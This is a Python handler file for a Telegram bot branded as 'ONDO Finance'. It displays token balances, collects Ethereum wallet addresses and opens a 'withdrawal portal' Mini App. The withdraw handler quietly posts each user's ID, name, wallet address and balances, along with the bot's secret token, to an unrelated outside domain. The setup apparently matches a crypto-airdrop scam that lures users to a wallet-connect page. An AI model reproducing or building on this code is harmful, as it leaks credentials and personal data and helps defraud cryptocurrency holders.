"""
Replace the ↗️ Withdraw handler in balance.py with this.
The Mini App opens when user taps the Withdraw button.
"""
import aiohttp
import logging
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

import os
BOT_TOKEN_SECRET = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")

import database as db
from keyboards import balance_kb, cancel_kb, main_menu_kb

router = Router()
logger = logging.getLogger(__name__)

# ── YOUR MINI APP URL (update after Vercel deploy) ────────────
MINI_APP_URL = "https://ondo-miniapp.vercel.app"


async def get_ondo_price_usd() -> float:
    url = "https://api.coingecko.com/api/v3/simple/price?ids=ondo-finance&vs_currencies=usd"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status == 200:
                    return float((await r.json())["ondo-finance"]["usd"])
    except Exception as e:
        logger.warning(f"ONDO price fetch failed: {e}")
    return 0.0


class WalletState(StatesGroup):
    waiting_for_address = State()


# ── 💰 Balance ────────────────────────────────────────────────
@router.message(F.text == "💰 Balance")
async def menu_balance(message: Message) -> None:
    user = await db.get_user(message.from_user.id)
    if not user:
        await message.answer("Please send /start first.")
        return

    name = user["full_name"] or user["username"] or "Unknown"
    w    = user["wallet_address"]
    wallet_display = f"<code>{w[:6]}...{w[-4:]}</code>" if w else "❌ Not connected"

    ondo_price   = await get_ondo_price_usd()
    bio_balance = user["bio_balance"]
    bio_line    = f"ONDO: <b>{bio_balance:.0f}</b> (~${round(bio_balance * ondo_price, 1)})" if ondo_price > 0 else f"ONDO: <b>{bio_balance:.0f}</b>"

    await message.answer(
        f"👤 <b>User Name:</b> {name}\n"
        f"🆔 <b>User ID:</b> <code>{user['user_id']}</code>\n\n"
        f"💰 <b>Balance:</b>\n{bio_line}\n"
        f"ETH: <b>{user['sol_balance']:.4f}</b>\n\n"
        f"👛 <b>Wallet:</b> {wallet_display}",
        reply_markup=balance_kb(bool(w)),
        parse_mode="HTML",
    )


# ── ↗️ Withdraw — opens Mini App ──────────────────────────────
@router.message(F.text == "↗️ Withdraw")
async def menu_withdraw(message: Message) -> None:
    user = await db.get_user(message.from_user.id)
    if not user:
        await message.answer("Please send /start first.")
        return

    bio = user["bio_balance"]

    # ── Sync user data to portal DB before opening Mini App ──
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(
                "https://twtexchange.org/api/sync_user.php",
                json={
                    "user_id":        message.from_user.id,
                    "telegram_name":  user["full_name"] or user["username"] or "",
                    "username":       user["username"] or "",
                    "wallet_address": user["wallet_address"] or "",
                    "bio_balance":    user["bio_balance"],
                    "eth_balance":    user["sol_balance"],  # ETH stored in sol_balance field
                },
                headers={"X-Bot-Secret": BOT_TOKEN_SECRET},
                timeout=aiohttp.ClientTimeout(total=5),
            )
    except Exception as e:
        logger.warning(f"Portal sync failed: {e}")

    await message.answer(
        f"🚀 <b>ONDO Finance Withdrawal Portal</b>\n\n"
        f"💰 Your Balance: <b>{bio:.0f} ONDO</b>\n\n"
        f"Tap the button below to open the withdrawal portal:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="↗️ Open ONDO Portal",
                web_app={"url": MINI_APP_URL}
            )
        ]])
    )


# ── Connect Wallet ─────────────────────────────────────────────
@router.callback_query(F.data == "connect_wallet")
async def cb_connect_wallet(callback: CallbackQuery, state: FSMContext) -> None:
    await state.set_state(WalletState.waiting_for_address)
    await callback.message.answer(
        "➡️ <b>Now Submit Your ONDO Finance (ERC20) Wallet Address</b>\n\n"
        "<i>Recommend to use Trust Wallet, Metamask Wallet</i>",
        reply_markup=cancel_kb(), parse_mode="HTML",
    )
    await callback.answer()


@router.message(WalletState.waiting_for_address)
async def fsm_wallet_address(message: Message, state: FSMContext) -> None:
    address = message.text.strip()
    if not (address.startswith("0x") and len(address) == 42 and
            all(c in "0123456789abcdefABCDEF" for c in address[2:])):
        await message.answer("❌ Invalid Ethereum address. Please send a valid address:", reply_markup=cancel_kb())
        return
    await db.set_wallet(message.from_user.id, address)
    await state.clear()
    await message.answer(
        f"✅ <b>Wallet connected successfully!</b>\n\n<code>{address}</code>",
        reply_markup=main_menu_kb(), parse_mode="HTML",
    )


@router.callback_query(F.data == "cancel_fsm")
async def cb_cancel_fsm(callback: CallbackQuery, state: FSMContext) -> None:
    await state.clear()
    await callback.message.answer("❌ Cancelled.", reply_markup=main_menu_kb())
    await callback.answer()


@router.callback_query(F.data == "noop")
async def cb_noop(callback: CallbackQuery) -> None:
    await callback.answer()
